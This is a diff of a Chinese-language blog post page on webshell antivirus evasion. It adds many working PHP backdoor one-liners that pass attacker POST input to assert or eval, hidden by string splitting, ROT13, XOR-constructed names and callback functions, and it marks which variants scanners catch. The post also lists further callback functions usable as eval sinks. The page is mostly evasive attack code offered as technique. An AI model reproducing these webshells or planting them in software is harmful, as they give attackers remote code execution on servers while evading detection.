@@ -8,7 +8,7 @@
   
   
   
-  <title>webshell免殺 | JohnScott2046的博客</title>
+  <title>42webshell免殺 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>webshell免殺</span>
+    <span>42webshell免殺</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-10-02
+      2021-10-11
     </span>
     
       <span>
@@ -285,6 +285,7 @@
 <p>2級  可疑<br>函數名無關 主要取決於eval裡的參數</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function x() &#123;</span><br><span class="line">  return $_POST[&#39;aaa&#39;];</span><br><span class="line">&#125;</span><br><span class="line">eval(x());</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $a &#x3D; &#39;ass&#39;;</span><br><span class="line">  $b &#x3D; &#39;er&#39;;</span><br><span class="line">  $c &#x3D; &#39;t&#39;;</span><br><span class="line">  $d &#x3D; $a.$b.$c;</span><br><span class="line">  $d($_POST[&#39;abc&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class x</span><br><span class="line">&#123;</span><br><span class="line">  function __construct() &#123;</span><br><span class="line">    @eval(&quot;&#x2F;*112233*&#x2F;&quot;.$_POST[&#39;aaa&#39;].&quot;&#x2F;*111222*&#x2F;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">new x();</span><br></pre></td></tr></table></figure>
@@ -296,6 +297,11 @@
 <p>1級 變量函數 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; substr_replace(&quot;xxser&quot;,&quot;asser&quot;,-3);</span><br><span class="line">$aa &#x3D; array(&#39;&#39;,$a);</span><br><span class="line">$b &#x3D; $aa[1].chr(&#39;116&#39;);</span><br><span class="line">$fun&#x3D;preg_replace(&quot;&#x2F;xx&#x2F;&quot;,&quot;&quot;,$b);</span><br><span class="line">$cc &#x3D; substr_replace(&quot;&quot;,$fun,0);</span><br><span class="line">$cc($_POST[&#39;x&#39;]);</span><br></pre></td></tr></table></figure>
 
+<p>1級 函数绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function NH($acd)&#123;</span><br><span class="line">forward_static_call_array($acd,array($_POST[&#39;abc&#39;]));</span><br><span class="line">&#125;</span><br><span class="line">NH(assert);</span><br></pre></td></tr></table></figure>
+
+<p>1級 类绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class NH &#123;</span><br><span class="line">  function __construct($a) &#123;</span><br><span class="line">    $c&#x3D;$a;</span><br><span class="line">    forward_static_call_array($c,array($_POST[&#39;abc&#39;]));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p1&#x3D;new NH(eval);</span><br></pre></td></tr></table></figure>
 
 <p>ok</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">$a &#x3D; array($arrayName &#x3D; ($arrayName &#x3D;($arrayName &#x3D; array(&#39;a&#39; &#x3D;&gt; $b($_POST[&#39;x&#39;])))));</span><br></pre></td></tr></table></figure>
@@ -307,16 +313,53 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $args &#x3D; &quot;tony&quot;;</span><br><span class="line">    $code &#x3D; &quot;n;&#125;$_POST[x];&#x2F;*&quot;;</span><br><span class="line">    echo create_function(&#39;$args&#39;,$code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
+<h3 id="編碼-被识别"><a href="#編碼-被识别" class="headerlink" title="編碼(被识别)"></a>編碼(被识别)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $c&#x3D;str_rot13(&#39;nffreg&#39;);</span><br><span class="line">  $c($_POST[&#39;abc&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<h3 id="动态函数绕过-被识别"><a href="#动态函数绕过-被识别" class="headerlink" title="动态函数绕过(被识别)"></a>动态函数绕过(被识别)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $a &#x3D; &#39;assert&#39;;</span><br><span class="line">  $b &#x3D; &#39;_POST&#39;;</span><br><span class="line">  $a($$b[&#39;abc&#39;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="异或-exclusive-or-xor"><a href="#异或-exclusive-or-xor" class="headerlink" title="异或 exclusive or    xor"></a>异或 exclusive or    xor</h3><p>如果两个值不相同，结果为1，相同结果为0</p>
 <p>0^0=0<br>0^1=1<br>1^0=1<br>1^1=0</p>
 <p>0异或任何数，等于任何数<br>1异或任何数，等于任何数取反<br>任何数异或自己，等于自己置0</p>
 <p>assert 可以用异或<br>eval 可以用工具，不能异或</p>
 <p>$f=’assert’;$f(….)</p>
-<p>call_user_func(“assert”,getFlag());</p>
+<p>call_user_func(“assert”, getFlag());</p>
 <p>$<em>GET<a href="">_</a>;&amp;</em>=getFlag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;getFlag</span><br><span class="line"></span><br><span class="line">find &#x2F;etc&#x2F;* -type f  -exec md5sum&#123;&#125; \;  &gt; 1.txt</span><br><span class="line"></span><br><span class="line">chattr +a filename  只能最加内容  不能删除</span><br><span class="line">chattr -a filename  恢复</span><br><span class="line"></span><br><span class="line">lsattr !$</span><br><span class="line">i 目录  不能创建和删除 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;getFlag</span><br><span class="line"></span><br><span class="line">find &#x2F;etc&#x2F;* -type f  -exec md5sum&#123;&#125; \;  &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>chattr +a filename  只能最加内容  不能删除<br>chattr -a filename  恢复</p>
+<p>lsattr !$<br>i 目录  不能创建和删除 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure>
+
+
+<p>一个非数字字母的 $_POST<a href="$_POST%5B1%5D">0</a>;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">$__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">$__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">$__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">$__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br></pre></td></tr></table></figure>
+
+<p>拼接_POST</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>_GET</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>_POST</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot;           </span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="其他回调函数"><a href="#其他回调函数" class="headerlink" title="其他回调函数"></a>其他回调函数</h3><p>call_user_func_array()</p>
+<p>call_user_func()</p>
+<p>array_filter()</p>
+<p>array_walk()</p>
+<p>array_map()</p>
+<p>registregister_shutdown_function()</p>
+<p>register_tick_function()</p>
+<p>filter_var()</p>
+<p>filter_var_array()</p>
+<p>uasort()</p>
+<p>uksort()</p>
+<p>array_reduce()</p>
+<p>array_walk()</p>
+<p>array_walk_recursive()</p>
     </div>
   </div>
   
@@ -419,13 +462,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/41webshell/" target="_self">webshell</a>
+        <a href="/2021/41webshell/" target="_self">41webshell</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/43%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" target="_self">未授权访问漏洞</a>
+        <a href="/2021/43%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" target="_self">43未授权访问漏洞</a>
         <i class="iconfont icon-next"></i>
       </div>
     
